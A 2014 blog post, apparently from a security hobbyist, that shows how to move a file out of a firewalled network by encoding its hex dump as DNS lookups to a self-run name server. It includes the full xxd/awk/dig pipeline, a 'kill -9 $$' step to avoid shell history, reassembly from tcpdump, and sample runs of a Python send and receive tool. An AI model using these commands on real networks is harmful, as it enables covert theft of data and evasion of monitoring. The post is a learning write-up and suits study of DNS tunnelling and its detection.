<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>dnsfilexfer - yet another take on file transfer via DNS | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.
this article is not&mldr;
&mldr; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="dnsfilexfer - yet another take on file transfer via DNS">
<meta property="og:description" content="This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.
this article is not&mldr;
&mldr; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2014-03-11T00:00:00+00:00">
<meta property="article:modified_time" content="2014-03-11T00:00:00+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="dnsfilexfer - yet another take on file transfer via DNS">
<meta name=twitter:description content="This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.
this article is not&mldr;
&mldr; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"dnsfilexfer - yet another take on file transfer via DNS","item":"https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"dnsfilexfer - yet another take on file transfer via DNS","name":"dnsfilexfer - yet another take on file transfer via DNS","description":"This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.\nthis article is not\u0026hellip; \u0026hellip; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.\n","keywords":[],"articleBody":"This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.\nthis article is not… … about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.\nthe idea At its very core, the idea of DNS file transfers and DNS tunnelling resides in the fact that a few cleverly crafted DNS queries could be merged \u0026 formatted together to form part of a larger chunk of data. While DNS itself is not actually meant for file transfers, this method is obviously a very hacky approach.\nConsider the following scenario.\nYou have access to a very secure network. Secure in the sense that the firewalls are configured to allow NO outbound tcp connectivity. In fact, UDP is also limited to only allow DNS queries as a primary DNS server lives outside of this secure network, and provides most of the networks for this company with DNS services. Lets not dabble in the fact that the network can not receive any software updates etc, and just focus on the fact that it is a highly restricted network and contains potentially sensitive data.\nYou on the other hand, are responsible to come into the data centre where this network resides physically, and have some configuration changes to make, which involves you logging onto the console of a said server. While logged in, you notice a file, z300_technical_diagrams.zip. Looks pretty juicy! But, the file is close to 20MB, and the flash disk you have with you will be handed back to its owner before you leave the premises. You are also very aware of the security posture of this network and know that the only connectivity that is allowed outbound is udp/53.\nLuckily for you, you have a DNS file transfer server setup at home. You choose to use that as you would like to be sure that incase there may be some form of IPS on the border, your traffic wont be filtered. Your traffic will look like legit, semi ‘non-suspect’ DNS lookup requests.\nthe setup So, to get the file z300_technical_diagrams.zip out of this network, we need to create DNS lookups of parts of this file, specifying the name server to use. We test that lookups work with a quick dig to our name server at home. (server ip swapped to 127.0.0.1)\n% dig A 123456.fake.com @127.0.0.1 ;  DiG 9.8.3-P1  123456.fake.com @127.0.0.1 ;; global options: +cmd ;; Got answer: ;; -HEADERGreat, so it seems like we have working comms to our own name server, as we got a answer of 127.0.0.1. Our server will always respond with 127.0.0.1 being the IP.\npreparing the file With comms working to our name server, we can get some information about the file and test if a hex dump tool like xxd is available. This will enable us to break the file up in to little parts that can be used as DNS questions.\n% ls -lah z300_technical_diagrams.zip -rw-r--r-- 1 bob staff 20.1M Jan 27 01:01 z300_technical_diagrams.zip % xxd -p z300_technical_diagrams.zip 504b03040a000000000042a9384400000000000000000000000017001c00 7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47 e3523947e35275780b000104f50100000414000000504b03040a00000000 0049a938440000000000000000000000001b001c007068616e746f6d6a73 [snip] Great. It looks like we have everything we need to make this work. :)\n‘transferring’ the file Now, we will use a simple awk, and prepare a few dig queries to our name server and finally, run the actual lookups. The best way to explain what is happening here is to actually show it:\n% xxd -p z300_technical_diagrams.zip | awk '{ print \"dig \" $1 \".fake.io @127.0.0.1 +short\" }' dig 2e965f1608019c826a5b89b9a881b6df63a634a3ca83c01aa349411e4fa0.fake.io @127.0.0.1 +short dig 37aec06d77acd4d16ca559e008078e8bbfa2e1f0e3db8b995885fe398d48.fake.io @127.0.0.1 +short dig 763b55cfda9b977328588068d3a9b63b06811f5ecfae570e3f6e2d8b5e34.fake.io @127.0.0.1 +short dig 97b223da3800b1341ced3cc9e8542f53c0e123965e24591a9b75f58d4330.fake.io @127.0.0.1 +short dig eb9287c294832c7a79a84dc1cd066baf7e51adabc070eab8477a7cc4530d.fake.io @127.0.0.1 +short dig 9110217bcafcbaa48eee91567bfd698a76c70961ca9fea3402f929d4ee87.fake.io @127.0.0.1 +short dig f543e9a8c27602aeb2f6744a5097a7f20404f3e53d513c11d63e70434a71.fake.io @127.0.0.1 +short dig 61e85f16195f2fa75a82368cfbc781ace543ab22fcb72c97fbdb03015f8c.fake.io @127.0.0.1 +short [snip] As you can see, the output has generated a whole bunch of potential lookups for random strings. The same command above is rerun, but with | sh at the end, performing the actual lookups. On our server, we have tcpdump listening on port 53, writing all of the recorded packets to a file.\nback home We close our bash session with kill -9 $$ to prevent any history from writing and relogin, completing the original work we came for.\nBack home, it was time to stop the tcpdump that was running, and attempt to reassemble that file. The domain we used for the lookups was fake.io, so we just grep the output for that to ensure that we got the relevant parts (real ip’s masked to 127.0.0.1):\n% tcpdump -r raw -n | grep fake.io reading from file raw, link-type NULL (BSD loopback) 19:31:32.919144 IP 127.0.0.1.49331  127.0.0.1.53: 39001+ A? 504b03040a000000000042a9384400000000000000000000000017001c00.fake.io. (86) 19:31:32.925135 IP 127.0.0.1.51116  127.0.0.1.53: 23736+ A? 7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47.fake.io. (86) [snip] Excellent! As we can see, we got some recorded requests, similar to those that we originally sent earlier in the day. Lets filter the output a little more, so that we sit with only the original hashes as output.\n% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1 reading from file raw, link-type NULL (BSD loopback) 504b03040a000000000042a9384400000000000000000000000017001c00 7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47 [snip] Lastly, we can pipe all of this through xxd -r and redirect the output to a new file. If all went well, this file should be z300_technical_diagrams.zip\n% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1 | xxd -r  z300_technical_diagrams.zip % file z300_technical_diagrams.zip z300_technical_diagrams.zip: Zip archive data, at least v1.0 to extract python all the things Using only some bash commands, we have managed to transfer a file over the network using only DNS. This method however assumes that you have a running name server on the remote end that would actually respond to your requests, otherwise your lookups may take a very long time for the dig command to timeout, and it would retry like 3 times which would mean you would need to uniq your results before you xxd -r them.\nSo, in order for me to learn something new, I figured I’d write some python to help with this file transferring over DNS. Heck, maybe it could even result in something actually useful :o\nThe idea is simple. Create a fake DNS server that would listen and parse DNS packets. Allow for simple switches to write the received files to disk, and add a optional layer of encryption to the requests.\ndnsfilexfer So, I took a day (literally), and a few more hours afterwards for bug fixes and wrote something that does this. Consisting of two pretty self explanatory parts; dns_send.py \u0026 dns_recv.py, one is able to ‘send files’ using DNS lookups and store them on the remote end. You also have the option of only using the send part with the -X flag, and have the output ready to use with xxd -r later on your server.\nThe code can be found here\nsample usage Below a full example of the usage, both on the client \u0026 server:\nWe start the ‘server’ component along with a secret that will be used to decrypt received messages. For now, we have omitted -F as we are not going to write the message to a file, yet.\n% sudo python dns_recv.py --listen 0.0.0.0 --secret What is the secret? [INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret. % With our ‘server’ started, we go to a client, and prepare the sending of a message by creating a sample message, and using the send script to sent it:\n% echo \"This is a test message that will be sent over DNS\\n Cool eh?\"  /tmp/message % cat /tmp/message This is a test message that will be sent over DNS Cool eh? % python dns_send.py --server 127.0.0.1 --file /tmp/message --indentifier dns_message_test --secret What is the secret? [INFO] Message is encypted with the secret ---START OF MESSAGE--- /lHsvTZT3nJfQgdtUWSpKDqrpKuK+eLrU3bpAp9aNDJt6K/mwEc8sBUaJybPh7r5h2AOkJVezwBBODSV9hFM8w== ---END OF MESSAGE--- [INFO] Sending lookup for : 00006:10000000000000000000000000000000000000000000000000.fake.io [INFO] Sending lookup for : 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io [INFO] Sending lookup for : 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io [INFO] Sending lookup for : 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io [INFO] Sending lookup for : 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io [INFO] Sending lookup for : 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io [INFO] Sending lookup for : 000638773d3d.fake.io [INFO] Sending lookup for : 00000000000000000000000000000000000000000000000000000000.fake.io [INFO] Message sent in 8 requests We can see that the message was ‘sent’ using 8 requests and the --START OF MESSAGE-- preview contains the encrypted version of our message. Looking at the server, we see that the message is received:\n% sudo python dns_recv.py --listen 0.0.0.0 --secret Password: What is the secret? [INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret. [INFO] Full resource record query was for: 00006:10000000000000000000000000000000000000000000000000.fake.io. [INFO] Processing frame 00006:10000000000000000000000000000000000000000000000000 [INFO] Full resource record query was for: 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io. [INFO] Processing frame 0001646e735f6d6573736167655f7465737400000000000000000000 [INFO] Full resource record query was for: 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io. [INFO] Processing frame 00028bf2046ae2144be75d2ce780b3f992e2c368021e [INFO] Full resource record query was for: 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io. [INFO] Processing frame 00032f6c487376545a54336e4a6651676474555753704b447172704b754b [INFO] Full resource record query was for: 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io. [INFO] Processing frame 00042b654c7255336270417039614e444a74364b2f6d7745633873425561 [INFO] Full resource record query was for: 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io. [INFO] Processing frame 00054a796250683772356832414f6b4a56657a7742424f4453563968464d [INFO] Full resource record query was for: 000638773d3d.fake.io. [INFO] Processing frame 000638773d3d [INFO] Full resource record query was for: 00000000000000000000000000000000000000000000000000000000.fake.io. [INFO] Processing frame 00000000000000000000000000000000000000000000000000000000 [OK] Message seems to be intact and passes sha1 checksum of 8bf2046ae2144be75d2ce780b3f992e2c368021e [OK] Message was received in 8 requests [INFO] Message has been decrypted with the configured secret Message identifier: dns_message_test ---START OF MESSAGE--- This is a test message that will be sent over DNS Cool eh? ---END OF MESSAGE--- The scripts have some basic checksumming checks to ensure that the message that is received on the other end is intact. Of course, this is not limited to ASCII transfers only. Any file format inc. binary formats should work just fine. HOWEVER Be cautious of that fact that the file size determines the amount of requests required to send the message across the wire.\nUsing encryption by specifying a secret is entirely optional, as well as specifying a output file for the receiver script.\nSome afterthoughts So this technique obviously has many challenges, such as the classic stateless nature of UDP that may cause out-of-sequence/lost frames (I am actually thinking of building some re-transmission logic into the scripts for lulz), the fact that the outgoing DNS port may be destination natted etc. In the case of a destination nat for udp/53, once could potentially query a zone whos name server you have control over, and capture the requests using a tcpdump there. One would then specify a specific fake domain to use with --domain on the sending script, and have something like fake..com, which will result in you still being able to grep for fake in the tcpdump replay.\nfurther reading https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306 http://www.aldeid.com/wiki/File-transfer-via-DNS\n","wordCount":"1891","inLanguage":"en","datePublished":"2014-03-11T00:00:00Z","dateModified":"2014-03-11T00:00:00Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
dnsfilexfer - yet another take on file transfer via DNS
</h1>
<div class=post-meta>March 11, 2014&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2014-03-11-dnsfilexfer-yet-another-take-on-file-transfer-via-dns.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul><ul><ul>
<li>
<a href=#this-article-is-not aria-label="this article is not&amp;hellip;">this article is not&mldr;</a></li></ul>
<li>
<a href=#the-idea aria-label="the idea">the idea</a></li>
<li>
<a href=#the-setup aria-label="the setup">the setup</a></li>
<li>
<a href=#preparing-the-file aria-label="preparing the file">preparing the file</a></li>
<li>
<a href=#transferring-the-file aria-label="&amp;lsquo;transferring&amp;rsquo; the file">&lsquo;transferring&rsquo; the file</a></li>
<li>
<a href=#back-home aria-label="back home">back home</a></li>
<li>
<a href=#python-all-the-things aria-label="python all the things">python all the things</a></li></ul>
<li>
<a href=#dnsfilexfer aria-label=dnsfilexfer>dnsfilexfer</a><ul>
<li>
<a href=#sample-usage aria-label="sample usage">sample usage</a></li>
<li>
<a href=#some-afterthoughts aria-label="Some afterthoughts">Some afterthoughts</a><ul>
<li>
<a href=#further-reading aria-label="further reading">further reading</a>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p>This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.</p>
<h3 id=this-article-is-not>this article is not&mldr;<a hidden class=anchor aria-hidden=true href=#this-article-is-not>#</a></h3>
<p>&mldr; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.</p>
<h2 id=the-idea>the idea<a hidden class=anchor aria-hidden=true href=#the-idea>#</a></h2>
<p>At its very core, the idea of DNS file transfers and DNS tunnelling resides in the fact that a few cleverly crafted DNS queries could be merged & formatted together to form part of a larger chunk of data. While DNS itself is not actually meant for file transfers, this method is obviously a very hacky approach.</p>
<p>Consider the following scenario.</p>
<p>You have access to a very <em>secure</em> network. <em>Secure</em> in the sense that the firewalls are configured to allow <strong>NO</strong> outbound tcp connectivity. In fact, UDP is also limited to only allow DNS queries as a primary DNS server lives outside of this <em>secure</em> network, and provides most of the networks for this company with DNS services. Lets not dabble in the fact that the network can not receive any software updates etc, and just focus on the fact that it is a highly restricted network and contains potentially sensitive data.</p>
<p>You on the other hand, are responsible to come into the data centre where this network resides physically, and have some configuration changes to make, which involves you logging onto the console of a said server. While logged in, you notice a file, <code>z300_technical_diagrams.zip</code>. Looks pretty juicy! But, the file is close to 20MB, and the flash disk you have with you will be handed back to its owner before you leave the premises. You are also very aware of the security posture of this network and know that the only connectivity that is allowed outbound is udp/53.</p>
<p>Luckily for you, you have a DNS file transfer server setup at home. You choose to use that as you would like to be sure that incase there may be some form of IPS on the border, your traffic wont be filtered. Your traffic will look like legit, semi &lsquo;non-suspect&rsquo; DNS lookup requests.</p>
<h2 id=the-setup>the setup<a hidden class=anchor aria-hidden=true href=#the-setup>#</a></h2>
<p>So, to get the file <code>z300_technical_diagrams.zip</code> out of this network, we need to create DNS lookups of parts of this file, specifying the name server to use. We test that lookups work with a quick dig to our name server at home. (server ip swapped to 127.0.0.1)</p>
<pre tabindex=0><code>% dig A 123456.fake.com @127.0.0.1

; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; 123456.fake.com @127.0.0.1
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24059
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;123456.fake.com.    IN A

;; ANSWER SECTION:
123456.fake.com.  60 IN A  127.0.0.1

;; Query time: 0 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)
;; WHEN: Tue Mar 11 07:55:31 2014
;; MSG SIZE  rcvd: 49
</code></pre><p>Great, so it seems like we have working comms to our own name server, as we got a answer of 127.0.0.1. Our server will always respond with 127.0.0.1 being the IP.</p>
<h2 id=preparing-the-file>preparing the file<a hidden class=anchor aria-hidden=true href=#preparing-the-file>#</a></h2>
<p>With comms working to our name server, we can get some information about the file and test if a hex dump tool like <code>xxd</code> is available. This will enable us to break the file up in to little parts that can be used as DNS questions.</p>
<pre tabindex=0><code>% ls -lah z300_technical_diagrams.zip
-rw-r--r--  1 bob  staff   20.1M Jan 27 01:01 z300_technical_diagrams.zip
% xxd -p z300_technical_diagrams.zip
504b03040a000000000042a9384400000000000000000000000017001c00
7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
e3523947e35275780b000104f50100000414000000504b03040a00000000
0049a938440000000000000000000000001b001c007068616e746f6d6a73
[snip]
</code></pre><p>Great. It looks like we have everything we need to make this work. :)</p>
<h2 id=transferring-the-file>&lsquo;transferring&rsquo; the file<a hidden class=anchor aria-hidden=true href=#transferring-the-file>#</a></h2>
<p>Now, we will use a simple awk, and prepare a few dig queries to our name server and finally, run the actual lookups. The best way to explain what is happening here is to actually show it:</p>
<pre tabindex=0><code>% xxd -p z300_technical_diagrams.zip | awk '{ print &quot;dig &quot; $1 &quot;.fake.io @127.0.0.1 +short&quot; }'
dig 2e965f1608019c826a5b89b9a881b6df63a634a3ca83c01aa349411e4fa0.fake.io @127.0.0.1 +short
dig 37aec06d77acd4d16ca559e008078e8bbfa2e1f0e3db8b995885fe398d48.fake.io @127.0.0.1 +short
dig 763b55cfda9b977328588068d3a9b63b06811f5ecfae570e3f6e2d8b5e34.fake.io @127.0.0.1 +short
dig 97b223da3800b1341ced3cc9e8542f53c0e123965e24591a9b75f58d4330.fake.io @127.0.0.1 +short
dig eb9287c294832c7a79a84dc1cd066baf7e51adabc070eab8477a7cc4530d.fake.io @127.0.0.1 +short
dig 9110217bcafcbaa48eee91567bfd698a76c70961ca9fea3402f929d4ee87.fake.io @127.0.0.1 +short
dig f543e9a8c27602aeb2f6744a5097a7f20404f3e53d513c11d63e70434a71.fake.io @127.0.0.1 +short
dig 61e85f16195f2fa75a82368cfbc781ace543ab22fcb72c97fbdb03015f8c.fake.io @127.0.0.1 +short
[snip]
</code></pre><p>As you can see, the output has generated a whole bunch of potential lookups for random strings. The same command above is rerun, but with <code>| sh</code> at the end, performing the actual lookups.
On our server, we have tcpdump listening on port 53, writing all of the recorded packets to a file.</p>
<h2 id=back-home>back home<a hidden class=anchor aria-hidden=true href=#back-home>#</a></h2>
<p>We close our bash session with <code>kill -9 $$</code> to prevent any history from writing and relogin, completing the original work we came for.</p>
<p>Back home, it was time to stop the <code>tcpdump</code> that was running, and attempt to reassemble that file. The domain we used for the lookups was <code>fake.io</code>, so we just grep the output for that to ensure that we got the relevant parts (real ip&rsquo;s masked to 127.0.0.1):</p>
<pre tabindex=0><code>% tcpdump -r raw -n | grep fake.io
reading from file raw, link-type NULL (BSD loopback)
19:31:32.919144 IP 127.0.0.1.49331 &gt; 127.0.0.1.53: 39001+ A? 504b03040a000000000042a9384400000000000000000000000017001c00.fake.io. (86)
19:31:32.925135 IP 127.0.0.1.51116 &gt; 127.0.0.1.53: 23736+ A? 7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47.fake.io. (86)
[snip]
</code></pre><p>Excellent! As we can see, we got some recorded requests, similar to those that we originally sent earlier in the day. Lets filter the output a little more, so that we sit with only the original hashes as output.</p>
<pre tabindex=0><code>% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1
reading from file raw, link-type NULL (BSD loopback)
504b03040a000000000042a9384400000000000000000000000017001c00
7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
[snip]
</code></pre><p>Lastly, we can pipe all of this through <code>xxd -r</code> and redirect the output to a new file. If all went well, this file <em>should</em> be <code>z300_technical_diagrams.zip</code></p>
<pre tabindex=0><code>% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1 | xxd -r &gt; z300_technical_diagrams.zip

% file z300_technical_diagrams.zip
z300_technical_diagrams.zip: Zip archive data, at least v1.0 to extract
</code></pre><h2 id=python-all-the-things>python all the things<a hidden class=anchor aria-hidden=true href=#python-all-the-things>#</a></h2>
<p>Using only some bash commands, we have managed to transfer a file over the network using only DNS. This method however assumes that you have a running name server on the remote end that would actually respond to your requests, otherwise your lookups may take a very long time for the <code>dig</code> command to timeout, and it would retry like 3 times which would mean you would need to <code>uniq</code> your results before you <code>xxd -r</code> them.</p>
<p>So, in order for me to <em>learn something new</em>, I figured I&rsquo;d write some python to help with this file transferring over DNS. Heck, maybe it could even result in something actually useful :o</p>
<p>The idea is simple. Create a fake DNS server that would listen and parse DNS packets. Allow for simple switches to write the received files to disk, and add a optional layer of encryption to the requests.</p>
<h1 id=dnsfilexfer>dnsfilexfer<a hidden class=anchor aria-hidden=true href=#dnsfilexfer>#</a></h1>
<p>So, I took a day (literally), and a few more hours afterwards for bug fixes and wrote something that does this. Consisting of two pretty self explanatory parts; <code>dns_send.py</code> & <code>dns_recv.py</code>, one is able to &lsquo;send files&rsquo; using DNS lookups and store them on the remote end. You also have the option of only using the send part with the <code>-X</code> flag, and have the output ready to use with <code>xxd -r</code> later on your server.</p>
<p>The code can be <a href=https://github.com/leonjza/dnsfilexfer>found here</a></p>
<h2 id=sample-usage>sample usage<a hidden class=anchor aria-hidden=true href=#sample-usage>#</a></h2>
<p>Below a full example of the usage, both on the client & server:</p>
<p>We start the &lsquo;server&rsquo; component along with a secret that will be used to decrypt received messages. For now, we have omitted <code>-F</code> as we are not going to write the message to a file, yet.</p>
<pre tabindex=0><code>% sudo python dns_recv.py --listen 0.0.0.0 --secret
What is the secret?
[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
%
</code></pre><p>With our &lsquo;server&rsquo; started, we go to a client, and prepare the sending of a message by creating a sample message, and using the send script to sent it:</p>
<pre tabindex=0><code>% echo &quot;This is a test message that will be sent over DNS\n Cool eh?&quot; &gt; /tmp/message
% cat /tmp/message
This is a test message that will be sent over DNS
Cool eh?

% python dns_send.py --server 127.0.0.1 --file /tmp/message --indentifier dns_message_test --secret
What is the secret?
[INFO] Message is encypted with the secret
---START OF MESSAGE---
/lHsvTZT3nJfQgdtUWSpKDqrpKuK+eLrU3bpAp9aNDJt6K/mwEc8sBUaJybPh7r5h2AOkJVezwBBODSV9hFM8w==
---END OF MESSAGE---
[INFO] Sending lookup for : 00006:10000000000000000000000000000000000000000000000000.fake.io
[INFO] Sending lookup for : 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io
[INFO] Sending lookup for : 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io
[INFO] Sending lookup for : 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io
[INFO] Sending lookup for : 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io
[INFO] Sending lookup for : 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io
[INFO] Sending lookup for : 000638773d3d.fake.io
[INFO] Sending lookup for : 00000000000000000000000000000000000000000000000000000000.fake.io
[INFO] Message sent in 8 requests
</code></pre><p>We can see that the message was &lsquo;sent&rsquo; using 8 requests and the <code>--START OF MESSAGE--</code> preview contains the encrypted version of our message.
Looking at the server, we see that the message is received:</p>
<pre tabindex=0><code>% sudo python dns_recv.py --listen 0.0.0.0 --secret
Password:
What is the secret?
[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
[INFO] Full resource record query was for: 00006:10000000000000000000000000000000000000000000000000.fake.io.
[INFO] Processing frame 00006:10000000000000000000000000000000000000000000000000
